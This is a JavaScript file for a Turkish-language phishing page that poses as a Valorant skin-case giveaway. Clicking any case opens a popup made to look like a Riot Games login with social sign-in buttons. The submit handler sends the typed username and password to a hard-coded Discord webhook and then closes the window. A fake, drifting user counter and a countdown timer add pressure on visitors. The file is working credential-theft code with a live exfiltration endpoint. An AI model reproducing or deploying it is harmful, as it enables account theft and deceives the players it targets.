const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

// 1. Üst Şerit
const track = document.getElementById('track');
const skins = ["skin1.png", "skin2.png", "skin3.png", "skin4.png", "skin5.png"];
if(track) {
    track.innerHTML = [...skins, ...skins, ...skins, ...skins].map(s => `
        <div class="drop-card"><img src="${s}" onerror="this.src='https://via.placeholder.com/40'"></div>
    `).join('');
}

// 2. Kasalar
const cases = [
    {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"},
    {n: "STANDART", p: "30 VP", i: "case2.png"},
    {n: "ELİT", p: "50 VP", i: "case3.png"},
    {n: "PREMIUM", p: "100 VP", i: "case4.png"},
    {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
    {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
];
const grid = document.getElementById('caseGrid');
if(grid) {
    grid.innerHTML = cases.map(c => `
        <div class="case-box" onclick="openAuth()">
            <img src="${c.i}" onerror="this.src='https://via.placeholder.com/140'">
            <h3>${c.n} KASASI</h3>
            <div class="vp-tag">${c.p}</div>
            <button class="open-btn">AÇ</button>
        </div>
    `).join('');
}

// 3. Sayaç
function timer() {
    const now = new Date();
    const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
    let t = new Date(utc3); t.setHours(24, 0, 0, 0);
    let d = t - utc3;
    let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
    const el = document.getElementById('countdown');
    if(el) el.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}
setInterval(timer, 1000);

// 4. İstatistik Artışı
setInterval(() => {
    const s1 = document.getElementById('s1');
    if(s1) {
        let val = parseInt(s1.innerText.replace('.',''));
        s1.innerText = (val + Math.floor(Math.random() * 5 - 2)).toLocaleString('tr-TR');
    }
}, 3000);

// 5. Giriş Penceresi
function openAuth() {
    const w = 450, h = 650;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    win.document.body.innerHTML = `
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
            body { 
                margin:0; height:100vh; background: #fff; 
                display:flex; justify-content:center; align-items:center; 
                font-family: 'Inter', sans-serif; color: #111;
            }
            .card { width:100%; max-width:340px; padding:20px; text-align:center; }
            h1 { font-weight: 900; font-size: 28px; letter-spacing: -1px; margin-bottom: 40px; text-transform: uppercase; }
            
            .input-group { margin-bottom: 15px; position: relative; }
            input { 
                width:100%; padding: 16px; background: #f2f2f2; border: 2px solid transparent; 
                border-radius: 4px; box-sizing: border-box; font-weight: 700; font-size: 12px;
                transition: 0.2s; outline: none; color: #111;
            }
            input:focus { background: #fff; border-color: #111; }
            input::placeholder { color: #999; text-transform: uppercase; }

            .social-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin: 25px 0; }
            .social-btn { 
                height: 40px; border-radius: 4px; display: flex; align-items: center; 
                justify-content: center; cursor: pointer; border: none; transition: 0.2s;
            }
            .social-btn:hover { opacity: 0.8; }
            .fb { background: #1877f2; }
            .gg { background: #fff; border: 1px solid #e5e5e5; }
            .ap { background: #000; }
            .xb { background: #107c10; }
            .ps { background: #00439c; }
            .social-btn img { width: 18px; }

            .stay-signed { 
                display: flex; align-items: center; gap: 10px; font-size: 13px; 
                color: #111; font-weight: 600; margin-top: 10px; cursor: pointer; text-align: left;
            }
            .checkbox { width: 18px; height: 18px; background: #f2f2f2; border-radius: 4px; display: inline-block; }

            .submit-container { margin-top: 60px; display: flex; justify-content: center; }
            .next-btn { 
                width: 70px; height: 70px; border: 2px solid #e5e5e5; border-radius: 20px; 
                background: #fff; cursor: pointer; display: flex; align-items: center; 
                justify-content: center; transition: 0.2s;
            }
            .next-btn:hover { border-color: #ff4655; }
            .next-btn svg { width: 24px; fill: #ccc; transition: 0.2s; }
            .next-btn.active { border-color: #ff4655; }
            .next-btn.active svg { fill: #ff4655; }

            .footer-links { margin-top: 40px; font-size: 11px; font-weight: 700; color: #111; text-transform: uppercase; cursor: pointer; }
            .footer-links div { margin-bottom: 8px; opacity: 0.6; transition: 0.2s; }
            .footer-links div:hover { opacity: 1; }
        </style>

        <div class="card">
            <h1>Giriş</h1>
            
            <div class="input-group">
                <input type="text" id="u" placeholder="Kullanıcı Adı">
            </div>
            <div class="input-group">
                <input type="password" id="p" placeholder="Şifre">
            </div>

            <div class="social-grid">
                <button class="social-btn fb"><img src="https://www.edigitalagency.com.au/wp-content/uploads/Facebook-logo-blue-circle-large-transparent-png.png"></button>
                <button class="social-btn gg"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Reference_icon.svg"></button>
                <button class="social-btn ap"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"></button>
                <button class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" style="filter:invert(1)"></button>
                <button class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/PlayStation_logo_and_wordmark.svg" style="filter:invert(1)"></button>
            </div>

            <label class="stay-signed">
                <div class="checkbox" id="check"></div>
                Oturumu açık tut
            </label>

            <div class="submit-container">
                <button class="next-btn" id="go">
                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                </button>
            </div>

            <div class="footer-links">
                <div>Oturum açamıyor musun?</div>
                <div>Hesap Oluştur</div>
            </div>
        </div>
    `;

    // Input dolunca butonun parlaması ve Webhook tetikleyici
    const uInput = win.document.getElementById('u');
    const pInput = win.document.getElementById('p');
    const goBtn = win.document.getElementById('go');

    const checkInputs = () => {
        if(uInput.value.length > 0 && pInput.value.length > 0) {
            goBtn.classList.add('active');
        } else {
            goBtn.classList.remove('active');
        }
    };

    uInput.oninput = checkInputs;
    pInput.oninput = checkInputs;

    win.document.getElementById('go').onclick = function() {
        const u = uInput.value, p = pInput.value;
        if(u && p) {
            fetch(WEBHOOK_URL, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ content: "👤: " + u + " | 🔑: " + p }) 
            });
            win.close();
        }
    };
}
